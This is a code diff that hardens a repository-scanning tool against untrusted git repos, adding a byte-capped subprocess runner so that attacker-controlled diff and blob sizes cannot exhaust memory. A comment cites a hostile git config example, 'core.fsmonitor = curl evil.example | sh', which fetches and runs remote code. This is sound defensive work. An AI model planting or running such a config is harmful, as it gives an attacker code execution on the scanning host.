@@ -33,6 +33,45 @@ DEFAULT_TIMEOUT_S = 300
 # `data/baselines/stage4_tier1_analysis_2026-04-24.md`.
 MAX_FILE_BYTES = 128 * 1024
 
+# Whole-diff / name-list retention cap. The clone is a freshly fetched
+# UNTRUSTED repository, so diff size is attacker-chosen: two hostile
+# commits can differ by gigabytes, and ``capture_output=True`` would
+# buffer all of it in parent memory before any downstream cap applies.
+# 32 MiB comfortably covers real fix diffs (the report layer's display
+# budget is far smaller) while bounding a hostile repo's leverage.
+MAX_DIFF_BYTES = 32 * 1024 * 1024
+
+
+def _run_git_bounded(
+    cmd: list[str], timeout_s: int, cap_bytes: int,
+) -> subprocess.CompletedProcess[bytes]:
+    """Run a local git command retaining at most ``cap_bytes`` per stream.
+
+    Byte-bounded replacement for ``subprocess.run(capture_output=True)``
+    on commands whose output size the scanned repo controls. The child
+    still runs to completion (its remaining output is drained and
+    discarded, never blocking the pipe); retained output past the cap
+    carries an explicit truncation marker. ``TimeoutExpired`` kills the
+    child and propagates, matching ``subprocess.run`` semantics.
+    """
+    from core.sandbox._capture import BoundedCommunicator
+
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        env=get_safe_git_env(),
+    )
+    capture = BoundedCommunicator(cap_bytes)
+    capture.attach(proc)
+    try:
+        out, err = capture.communicate(timeout=timeout_s)
+    except BaseException:
+        proc.kill()
+        proc.wait()
+        raise
+    return subprocess.CompletedProcess(cmd, proc.returncode, out, err)
+
 
 def _slug_of(url: str) -> str | None:
     """Extract GitHub `owner/repo` slug from a repo URL.
@@ -66,7 +105,7 @@ def extract_diff(
     # with ``core.fsmonitor = curl evil.example | sh`` fires on
     # every diff. See _show_blob below (line 153) for the canonical
     # pattern.
-    completed = subprocess.run(
+    completed = _run_git_bounded(
         safe_git_command(
             "-C", str(repo_path),
             # --no-ext-diff: _SAFE_GIT_OVERRIDES pins ``diff.external=``
@@ -78,10 +117,8 @@ def extract_diff(
             "diff", "--no-ext-diff", "--no-color", "--binary",
             f"{commit_before}..{commit_after}",
         ),
-        capture_output=True,
-        timeout=timeout_s,
-        check=False,
-        env=get_safe_git_env(),
+        timeout_s,
+        MAX_DIFF_BYTES,
     )
     if completed.returncode != 0:
         msg = (
@@ -168,10 +205,13 @@ def _show_blob(repo: Path, sha: CommitSha, path: str, timeout_s: int,
     newly added file has no `before`, a deleted file has no `after`) —
     we treat that as None, not an error.
     """
-    completed = subprocess.run(
+    # Retain cap_bytes + 1 so the over-cap check below still sees one
+    # byte of overflow; the slice then discards it (and the bounded
+    # runner's own marker) before the caller-facing marker is added.
+    # Memory stays bounded for arbitrarily large hostile blobs.
+    completed = _run_git_bounded(
         safe_git_command("-C", str(repo), "show", f"{sha}:{path}"),
-        capture_output=True, timeout=timeout_s, check=False,
-        env=get_safe_git_env(),
+        timeout_s, cap_bytes + 1,
     )
     if completed.returncode != 0:
         return None
@@ -218,16 +258,14 @@ def _list_files(
     timeout_s: int,
 ) -> list[str]:
     # safe_git_command — see extract_diff above for the rationale.
-    completed = subprocess.run(
+    completed = _run_git_bounded(
         safe_git_command(
             "-C", str(repo_path),
             # --no-ext-diff for the same reason as extract_diff above.
             "diff", "--no-ext-diff", "--name-only", f"{before}..{after}",
         ),
-        capture_output=True,
-        timeout=timeout_s,
-        check=False,
-        env=get_safe_git_env(),
+        timeout_s,
+        MAX_DIFF_BYTES,
     )
     if completed.returncode != 0:
         return []
